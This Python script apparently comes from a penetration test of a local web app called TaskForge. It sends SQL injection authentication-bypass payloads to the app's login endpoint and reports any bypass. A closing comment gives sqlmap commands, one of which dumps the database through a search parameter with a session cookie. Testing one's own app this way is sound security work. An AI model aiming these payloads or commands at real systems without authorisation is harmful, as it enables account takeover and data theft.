#!/usr/bin/env python3
"""
sqli_check.py — a minimal sqlmap-equivalent for this environment.

This sandbox has no outbound internet access, so the real `sqlmap` tool
can't be installed here. This script demonstrates the same core technique
sqlmap automates - sending boolean-based and payload-based probes and
comparing responses - against TaskForge's actual /api/login endpoint.

The exact real-world sqlmap command this replaces is documented at the
bottom of this file and in ITERATION3_PENTEST_GUIDE.md.

Usage:
    python3 sqli_check.py http://localhost:3000
"""
import sys
import json
import requests

def try_login(base_url, username, password):
    r = requests.post(
        f"{base_url}/api/login",
        json={"username": username, "password": password},
        timeout=5,
    )
    return r.status_code, r.json()

def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:3000"

    print(f"Target: {base_url}/api/login\n")

    # 1. Baseline: a definitely-wrong login, to see what "false" looks like.
    status, body = try_login(base_url, "definitely_not_a_real_user", "wrong")
    print(f"[baseline] wrong creds -> {status} {body}")

    # 2. Boolean-based probe: does the query's TRUE/FALSE logic change the
    #    response? This is exactly what sqlmap's boolean-based blind
    #    technique automates at scale across every parameter.
    payloads = [
        ("admin' OR '1'='1", "anything"),
        ("admin' -- ", "anything"),
        ("' OR 1=1 -- ", "anything"),
        ("nonexistent' OR '1'='1' -- ", "anything"),
    ]

    print("\n[probing common SQLi auth-bypass payloads]")
    vulnerable = False
    for username, password in payloads:
        status, body = try_login(base_url, username, password)
        hit = status == 200 and "role" in body
        marker = "  <-- AUTH BYPASS" if hit else ""
        print(f"  username={username!r:45} -> {status} {body}{marker}")
        if hit:
            vulnerable = True

    print()
    if vulnerable:
        print("RESULT: /api/login is vulnerable to SQL Injection (authentication bypass).")
        print("A payload of the form  username = admin' --  logs in as that user with")
        print("NO valid password, because the query is built by string concatenation:")
        print("  SELECT * FROM users WHERE username = '<input>' AND password = '<input>'")
    else:
        print("RESULT: no SQLi auth bypass detected on /api/login (parameterised queries working).")

if __name__ == "__main__":
    main()

# ---------------------------------------------------------------------------
# Real-world equivalent (run this instead when sqlmap is actually available):
#
#   sqlmap -u "http://localhost:3000/api/login" \
#          --data '{"username":"admin","password":"admin123"}' \
#          --headers="Content-Type: application/json" \
#          --method POST \
#          --level=5 --risk=3 \
#          -p username --technique=B \
#          --batch
#
# For the search endpoint (GET parameter injection):
#
#   sqlmap -u "http://localhost:3000/api/tasks?search=test" \
#          --cookie="tf_session=<value>" \
#          -p search --batch --dump
# ---------------------------------------------------------------------------
